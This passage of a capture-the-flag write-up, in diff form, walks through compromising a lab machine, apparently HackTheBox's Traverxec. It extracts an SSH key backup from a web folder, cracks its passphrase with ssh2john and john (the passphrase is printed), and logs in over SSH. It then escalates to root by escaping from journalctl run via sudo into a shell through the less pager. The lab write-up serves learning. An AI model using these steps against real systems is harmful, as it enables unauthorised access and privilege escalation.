@@ -110,3 +110,72 @@ homedirs		/home
 homedirs_public		public_www
 ```
 
+In the /home/david/public_www folder we can find a backup file
+
+![image](https://user-images.githubusercontent.com/5285547/124393531-d7769000-dcf2-11eb-8b94-b40961993b44.png)
+
+Moving the backup file to the tmp file i extracted the data
+
+```
+tar -xvf backup-ssh-identity-files.tgz
+```
+
+![image](https://user-images.githubusercontent.com/5285547/124393598-14db1d80-dcf3-11eb-9c28-f6179112c44c.png)
+
+Now with the id_rsa key I can use ssh2john to crack the id_rsa, then get onto the box as David.
+
+```
+./ssh2john id_rsa > hash
+john hash wordlist
+```
+
+![image](https://user-images.githubusercontent.com/5285547/124393704-a9de1680-dcf3-11eb-9327-f9082bcaf77d.png)
+
+
+```
+ssh david@10.10.10.165 -i id_rsa
+Nowonly4me
+```
+
+Result!
+
+![image](https://user-images.githubusercontent.com/5285547/124393778-fa557400-dcf3-11eb-8cfa-2246c8d2e698.png)
+
+
+## Root
+
+In Davids home folder is a bash script showing a command we can run as root with no password
+
+```
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+```
+
+Running the last line gives us sudo execution, not time to find out how to exploit journalctl
+Seeing that -n means the last five lines, if we make the termainl smaller then 5 lines we should be bumped into the less command as root
+
+![image](https://user-images.githubusercontent.com/5285547/124394236-8a94b880-dcf6-11eb-935f-f5f95139647d.png)
+
+```
+!/bin/sh
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls;hostname
+nostromo_1.9.6-1.deb  root.txt
+traverxec
+```
+
+And get the root flag!
+
+
+
